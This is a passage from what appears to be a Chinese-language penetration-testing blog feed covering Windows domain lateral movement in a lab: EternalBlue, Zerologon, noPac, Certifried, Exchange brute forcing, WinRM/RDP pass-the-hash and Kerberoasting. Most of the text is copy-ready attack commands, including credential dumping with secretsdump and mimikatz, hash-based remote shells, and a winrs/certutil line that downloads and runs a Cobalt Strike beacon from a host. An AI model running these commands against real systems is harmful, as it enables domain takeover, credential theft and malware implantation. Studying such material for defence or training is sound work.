shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.3.21-32 #设置扫描目标段</span><br><span class="line">set threads 5 #设置扫描线程数</span><br><span class="line">run </span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665371240263-f542821a-9e04-48b8-b4f6-882818f242ae.png" alt="image.png"><br>绿色加号的主机存在漏洞<br>6、利用模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #主机不出网使用正向连接上线</span><br><span class="line">set rhost 192.168.3.25 #设置连接目标</span><br><span class="line">set rhosts 192.168.3.25 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665375274584-2e95fa71-a317-4ad7-a95b-00fb0ed63221.png" alt="image.png"><br>攻击其他主机方法相同</p><h2 id="CVE-2014-6324"><a href="#CVE-2014-6324" class="headerlink" title="CVE-2014-6324"></a>CVE-2014-6324</h2><p>见前面PTT横向移动</p><h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>影响范围:</p><blockquote><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><p>0、获取计算机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665410932146-aec216ae-ba22-4aef-8fd3-02a07f52908c.png" alt="image.png"><br>添加host<br><img src="/posts/661c6a19/1665411114084-78c3546e-ea6d-4a92-b373-9fc8752def79.png" alt="image.png"><br>注意配置kali的代理<br>1、连接DC清空凭证：<br><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665411325270-6aa26f11-c05b-4f24-b688-593d98d2b36c.png" alt="image.png"><br>2、获取域内HASH:<br><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665411717328-d779ca0f-1553-4f03-8466-86710aaee7ce.png" alt="image.png"><br>3、连接域控PTH：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665411760149-ab46a38e-eacd-45fe-b67b-0b1ace8b331c.png" alt="image.png"><br>4、后续恢复密码：<br>如果不恢复密码会对域环境造成严重破坏<br><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><p>前提条件：一个域内普通账号<br>影响版本：Windows基本全系列<br>前置：<br>1、开启代理：<br>利用proxifier开启代理<br>修改Host绑定域名和IP<br><img src="/posts/661c6a19/1665376677804-150d4126-2d33-405c-b0fd-60c41a75b54c.png" alt="image.png"><br>2、扫描探针：<br><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac scan -domain god.org -user webadmin -pass admin!@#45</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665376712725-cda647f9-2365-4b5d-8203-c674bb6fde01.png" alt="image.png"><br>存在漏洞<br>3、利用连接：<br><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665376940217-cf958f35-2aad-4577-b5f8-40a04188be03.png" alt="image.png"><br>成功与域控建立连接<br><img src="/posts/661c6a19/1665377154177-2a5c2fa7-c7f0-4ed0-9d2e-6d3150bd9ec5.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\owa2010cn-god.god.org cmd.exe</span><br></pre></td></tr></table></figure><p>返回cmd会话后利用下载命令像webserver下载木马<br>python一键利用<br><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sam_the_admin.py &quot;god.org/webadmin:admin!@#45&quot; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure><h2 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h2><p>当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。<br>影响：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本<br>前提条件：<br>1、一个域内普通账号<br>2、域内存在证书服务器<br>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts<br>192.168.1.15 xiaodi.local<br>192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA<br>192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local<br>获取CA结构名和计算机名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -config - -ping</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665407139248-514782cd-747f-4a74-bc31-8dd6d4553d88.png" alt="image.png"><br>域内信息<br>地址:192.168.118.147<br>CA机构：xiaodi-WIN-3C7SS32SQ6R-CA<br>计算机:WIN-3C7SS32SQ6R.xiaodi.local<br>利用前要再kali添加host</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665410030191-61191811-72b9-42fc-a9f0-757873e996c5.png" alt="image.png"><br>利用步骤<br><a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a><br>以下命令为3.0版本命令<br>1、申请低权限用户证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req &#x27;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665408920594-f809681c-5a98-4a04-b052-f5f49974d49e.png" alt="image.png"><br>2、检测证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx test.pfx</span><br></pre></td></tr></table></figure><p>3、创建一个机器账户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.118.147 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665409250623-f8858f7e-e7dd-485b-b893-54fa882469d3.png" alt="image.png"><br>4、设置机器账户属性(dNSHostName和DC一致)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.118.147 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&#x27; dNSHostName &#x27;[&quot;WIN-3C7SS32SQ6R.xiaodi.local&quot;]&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665409431279-49db4a3f-04c2-4707-87e0-be1c3857f3f6.png" alt="image.png"><br>5、再次申请证书：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req &#x27;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.118.147&#x27; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665409421547-ec463f04-704e-476f-a4cd-3a81106be586.png" alt="image.png"><br>6、检测证书：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.118.147</span><br></pre></td></tr></table></figure><p>记录返回的hash<br>7、导出HASH：<br><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py &#x27;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -hashes :10e02bef2258ad9b239e2281a01827a4</span><br></pre></td></tr></table></figure><p>8、利用HASH：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(五)-Exchange</title>
      <link href="/posts/fbfafbfe/"/>
      <url>/posts/fbfafbfe/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-五-Exchange"><a href="#内网横向移动-五-Exchange" class="headerlink" title="内网横向移动(五)-Exchange"></a>内网横向移动(五)-Exchange</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。Exchange是收费邮箱，但是国内微软并不直接出售Exchange邮箱，而是将Exchange、Lync、Sharepoint三款产品包装成Office365出售。Exchange server还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web系统或者是其他消息系统。<br><img src="/posts/fbfafbfe/1665051313257-eba6298f-816c-4399-ae9d-8b6adf879dea.png" alt="image.png"><br>老样子拿到一台主机权限并且提权<br><img src="/posts/fbfafbfe/1665110083114-1d28f9ab-ea04-4e82-9a04-2dd6cee47b6d.png" alt="image.png"></p><h2 id="Exchange探针"><a href="#Exchange探针" class="headerlink" title="Exchange探针"></a>Exchange探针</h2><h3 id="1、端口扫描"><a href="#1、端口扫描" class="headerlink" title="1、端口扫描"></a>1、端口扫描</h3><p>exchange会对外暴露接口如OWA,ECP等，会暴露在80端口，而且25&#x2F;587&#x2F;2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位exchange。<br><img src="/posts/fbfafbfe/1665110205173-0e658ae5-f225-4c9b-aa92-cee048584c59.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665110279057-8eb3f440-9c11-4e8f-9882-c8e6872ab37c.png" alt="image.png"></p><h3 id="2、SPN扫描"><a href="#2、SPN扫描" class="headerlink" title="2、SPN扫描"></a>2、SPN扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T 0day.org -q */*</span><br></pre></td></tr></table></figure><p><img src="/posts/fbfafbfe/1665110938554-9682a2c2-e200-4caf-b9f8-c0731476fb4d.png" alt="image.png"></p><h3 id="3、脚本探针"><a href="#3、脚本探针" class="headerlink" title="3、脚本探针"></a>3、脚本探针</h3><p><a href="https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetVersion_MatchVul.py">https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetVersion_MatchVul.py</a><br>需要搭建代理隧道(见前篇)然后再利用python进行探针</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p><img src="/posts/fbfafbfe/1665111206067-72fa56b7-b80d-4b93-843f-89f7edbdb821.png" alt="image.png"></p><h2 id="Exchange爆破"><a href="#Exchange爆破" class="headerlink" title="Exchange爆破"></a>Exchange爆破</h2><h3 id="1、Burp-Proxifier"><a href="#1、Burp-Proxifier" class="headerlink" title="1、Burp+Proxifier"></a>1、Burp+Proxifier</h3><p>利用Proxifier建立代理访问exchange的web服务 输入密码burp抓包<br>爆破用户名(密码可以通过前期mimikatz抓取密码获取)用户名字典可以通过(net user &#x2F;domain)获取<br><img src="/posts/fbfafbfe/1665112856629-bda1ee24-6f6e-4fdd-a547-69ccc487b397.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665112680134-1176f01f-8fea-4b71-9bfa-ee347a7effa8.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665112870284-6a542d03-4181-4c67-8ecc-463c9d4de823.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665113382511-80a0d949-2f45-4461-8225-0b0a14322872.png" alt="image.png"><br>jack 和 sqladmin爆破成功</p><h3 id="2、项目"><a href="#2、项目" class="headerlink" title="2、项目"></a>2、项目</h3><p><a href="https://github.com/grayddq/EBurst">https://github.com/grayddq/EBurst</a><br><a href="https://github.com/lazaars/MailSniper">https://github.com/lazaars/MailSniper</a></p><h2 id="Exchange漏洞"><a href="#Exchange漏洞" class="headerlink" title="Exchange漏洞"></a>Exchange漏洞</h2><p><a href="https://www.cnblogs.com/xiaozi/p/14481595.html">https://www.cnblogs.com/xiaozi/p/14481595.html</a><br><img src="/posts/fbfafbfe/1665051308061-116a996b-3318-45f0-a877-c7981ec470c4.png" alt="image.png"></p><h3 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h3><p><a href="https://github.com/Airboi/CVE-2020-17144-EXP">https://github.com/Airboi/CVE-2020-17144-EXP</a><br>添加一个hosts记录<br><img src="/posts/fbfafbfe/1665118491630-28950de5-b14b-4d35-a665-78659ce21fc5.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665118733194-f3c203a0-6735-433a-9bcc-c60805022973.png" alt="image.png"><br><img src="/posts/fbfafbfe/1665118843052-5cc63c53-b852-45e8-bae3-2c07f8418433.png" alt="image.png"></p><h3 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h3><p><a href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(四)-SPN&amp;WinRM&amp;WinRS&amp;RDP</title>
      <link href="/posts/5d21afd3/"/>
      <url>/posts/5d21afd3/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-四-SPN-amp-WinRM-amp-WinRS-amp-RDP"><a href="#内网横向移动-四-SPN-amp-WinRM-amp-WinRS-amp-RDP" class="headerlink" title="内网横向移动(四)-SPN&amp;WinRM&amp;WinRS&amp;RDP"></a>内网横向移动(四)-SPN&amp;WinRM&amp;WinRS&amp;RDP</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/5d21afd3/1664842686241-01c42a95-96c4-463f-b7eb-955a1db85cb5.png" alt="image.png"><br>已拿到webserver权限并且提权,进行信息搜集<br><img src="/posts/5d21afd3/1664843782716-fbcd5243-8654-481a-ab20-9eadd0bc0b15.png" alt="image.png"></p><h2 id="WinRM-amp-WinRS-明文-amp-NTLM"><a href="#WinRM-amp-WinRS-明文-amp-NTLM" class="headerlink" title="WinRM&amp;WinRS-明文&amp;NTLM"></a>WinRM&amp;WinRS-明文&amp;NTLM</h2><p>WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务。<br>默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。<br><strong>移动条件：双方都启用的Winrm rs的服务！</strong><br>使用此服务需要管理员级别凭据。<br>Windows 2008 以上版本默认自动状态，Windows Vista&#x2F;win7上必须手动启动；<br>Windows 2012之后的版本默认允许远程任意主机来管理。<br>攻击机开启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664846514743-d8935823-2c11-49e7-bc6a-e870c15333ff.png" alt="image.png"><br>1.探针可用：<br>cs 内置端口扫描5985</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664846262790-059379e9-3620-4822-a662-9f8e301604b8-1664853102178-9.png" alt="image.png"><br><img src="/posts/5d21afd3/1664846402961-6ad54459-e52e-4989-b59b-f0e22fa295cf.png" alt="image.png"><br>扫描到开放主机<br>2.连接执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664846601187-a56aa9e9-8c01-43e0-8b2d-aa4c2a08156a.png" alt="image.png"><br>需要在本机shell环境下执行后续上线方法还是老样子:到webserver下载后门然后执行<br>3.上线CS&amp;MSF:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe beacon.exe &amp; beacon.exe&quot;</span><br></pre></td></tr></table></figure><p>4.CS内置移动<br><img src="/posts/5d21afd3/1664847544296-e05376b8-f538-4cf0-a179-c526734b9e09.png" alt="image.png"></p><h2 id="RDP-明文-amp-NTLM"><a href="#RDP-明文-amp-NTLM" class="headerlink" title="RDP-明文&amp;NTLM"></a>RDP-明文&amp;NTLM</h2><p>远程桌面服务 支持明文及HASH连接<br><strong>条件</strong>：对方开启RDP服务 远程桌面<br>RDP连接：<br>1、直接在当前被控主机上进行远程连接<br>2、建立节点进行连接<br>3、端口的转发（当前2222去访问目标的3389）访问被控2222<br>由于其他主机并不出网,还是要利用建立节点或者建立通道进行连接<br>这里采用socks建立节点代理(具体操作见前篇)<br>1.探针服务：<br>cs 内置端口扫描3389</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID</span><br><span class="line">netstat -ano | find &quot;PID值&quot; # 找到进程对应的端口号</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664845984438-0adae4f2-28d8-48a6-9ad3-b2317ce42cbd.png" alt="image.png"><br>2.探针连接：<br>CrackMapExec&amp;MSF 批扫用户名密码验证(具体操作见前篇)<br>3.连接执行：<br>明文连接：利用刚才验证的密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /console /v:192.168.3.32 /admin</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664845841402-473ffea3-30e9-4696-b2e6-4aeaef293585.png" alt="image.png"><br><img src="/posts/5d21afd3/1664845572228-6efb0208-31e5-4e82-add6-d7ce52e7e8ab.png" alt="image.png"><br><img src="/posts/5d21afd3/1664845678178-c580af56-d0fe-4d2c-80cb-e9ad25543347.png" alt="image.png"><br>可以看到本地用户和域账户同时存在<br>HASH连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &quot;/run:mstsc /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><h2 id="Spn-amp-Kerberos-请求-amp-破解-amp-重写"><a href="#Spn-amp-Kerberos-请求-amp-破解-amp-重写" class="headerlink" title="Spn&amp;Kerberos-请求&amp;破解&amp;重写"></a>Spn&amp;Kerberos-请求&amp;破解&amp;重写</h2><p>由于上面的环境不符合需求为了方便不再上线cs直接在本机操作<br>Kerberoasting 攻击的利用：</p><ul><li>SPN服务发现</li><li>请求服务票据</li><li>服务票据的导出</li><li>服务票据的暴力破解</li></ul><p>如需利用需要配置策略加密方式(对比)<br>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。<br>DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。<br>请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5(注意这里的RC4只有加密类型为RC4才可以进行破解利用而AES256加密无法利用)，这意味着服务帐户的NTLM密码哈希用于加密服务票证。<br>黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。<br>如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。<br>Kerberos攻击条件：<br>采用rc4加密类型票据，工具Rubeus检测或看票据加密类型<br>1.扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T 0day.org -q */*</span><br><span class="line">powershell setspn -T 0day.org -q */* | findstr &quot;MSSQL&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664847870046-9e535d93-5917-47c6-a7bc-62f24a54b695.png" alt="image.png"><br>可以探针每台主机充当的角色以及开启的服务<br>2.检测<br><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664850580606-26233931-90e7-4217-aa39-31017ac5d0d4.png" alt="image.png"><br>如果遇到下图这种，则无法继续利用·<br><img src="/posts/5d21afd3/1664852450833-c55516ac-aaa6-428c-8666-dbe4d51f0f8d.png" alt="image.png"><br>3.请求：(人工判断)<br><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br></pre></td></tr></table></figure><p>使用mimikatz判断</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664851060997-6100a603-0f10-4432-b2ed-1686b625b32c.png" alt="image.png"><br>可以看到RC4加密<br>4.导出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664851269838-bbbcfe57-800a-4e71-8109-e1e93c3bdd90.png" alt="image.png"><br>5.破解：<br><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pass.txt为密码字典 根据前期信息搜集填入</span></span><br><span class="line">python tgsrepcrack.py pass.txt &quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/5d21afd3/1664851811482-a839dccc-2af1-45e3-9594-279ee6e9beb1.png" alt="image.png"><br>利用获取到的密码继续横向移动<br>5.重写：<br><a href="https://www.freebuf.com/articles/system/174967.html">https://www.freebuf.com/articles/system/174967.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(三)-PTH&amp;PTT&amp;PTK</title>
      <link href="/posts/b0cb9aff/"/>
      <url>/posts/b0cb9aff/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-三-PTH-amp-PTT-amp-PTK"><a href="#内网横向移动-三-PTH-amp-PTT-amp-PTK" class="headerlink" title="内网横向移动(三)-PTH&amp;PTT&amp;PTK"></a>内网横向移动(三)-PTH&amp;PTT&amp;PTK</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/b0cb9aff/1664590631667-13a73e03-1b19-4318-9d84-be23d45b95b1.png" alt="bfl2kYExirJ2o8jENtd6_g.png"><br><img src="/posts/b0cb9aff/1664590640844-ae091338-93fe-4eaf-8cbe-5fcf543e2f61.png" alt="image-20221001092803141.png"><br>已经拿下webserver并且已提权<br>信息搜集已完成<br><img src="/posts/b0cb9aff/1664590644692-a7aff714-0d37-4cad-b0a6-a37cc6229d2f.png" alt="image-20221001101059993.png"><br><img src="/posts/b0cb9aff/1664590650240-4dc5af18-52c7-46af-92cc-1bb8d6a14a33.png" alt="image-20221001101117535.png"></p><h2 id="简单了解PTH-amp-PTK-amp-PTT"><a href="#简单了解PTH-amp-PTK-amp-PTT" class="headerlink" title="简单了解PTH&amp;PTK&amp;PTT"></a>简单了解PTH&amp;PTK&amp;PTT</h2><p>pass the hash（哈希传递攻击，简称PTH）利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）<br>pass the ticket（票据传递攻击，简称PTK）  利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>pass the key（密钥传递攻击，简称PTT） 利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）</p><h2 id="PTH-Mimikatz-amp-NTLM"><a href="#PTH-Mimikatz-amp-NTLM" class="headerlink" title="PTH-Mimikatz&amp;NTLM"></a>PTH-Mimikatz&amp;NTLM</h2><p>PTH &#x3D; Pass The Hash，通过密码散列值 (通常是NTLM Hash)来进行攻击。<br>在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账号和密码。<br>因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在Window Server 2012 R2之前使用到的密码散列值是LM Hash，在2012 R2及其版本之后使用到的密码散列值是NTLM Hash。也就是如果对Window Server 2012 R2之前的版本进行渗透需要使用的是LM Hash<br><img src="/posts/b0cb9aff/1664590660969-02a98b3d-dceb-43d6-80aa-f0ed9812771b.png" alt="image-20221001095803479.png"></p><h3 id="1、Mimikatz"><a href="#1、Mimikatz" class="headerlink" title="1、Mimikatz"></a>1、Mimikatz</h3><p>利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 